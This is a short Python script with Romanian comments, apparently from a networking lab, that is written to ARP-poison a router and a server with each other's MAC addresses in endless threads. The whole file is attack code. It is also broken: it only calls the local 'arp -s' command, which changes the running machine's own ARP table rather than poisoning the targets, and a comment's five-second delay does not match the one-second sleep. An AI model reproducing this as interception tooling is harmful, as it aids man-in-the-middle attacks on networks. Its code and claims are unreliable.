import threading
import time
import subprocess

def arp_poison(target_ip, target_mac):
    while True:
        subprocess.run(['arp', '-s', target_ip, target_mac])
        time.sleep(1)  #asteapta 5 secunde intre fiecare poisoning

#adresa IP si MAC a routerului si serverului
router_ip = '198.7.0.1'
router_mac = '02:42:c6:0a:00:01'
server_ip = '198.7.0.2'
server_mac = '02:42:c6:0a:00:02'

#creeaza thread-uri separate pentru otravirea routerului si a serverului
router_thread = threading.Thread(target=arp_poison, args=(router_ip, server_mac))
server_thread = threading.Thread(target=arp_poison, args=(server_ip, router_mac))

#pornirea thread-urilor
router_thread.start()
server_thread.start()

#asteapta ca thread-urile sa se termine (nu se va intampla in acest caz pt ca functia ruleaza in loop infinit)
router_thread.join()
server_thread.join()

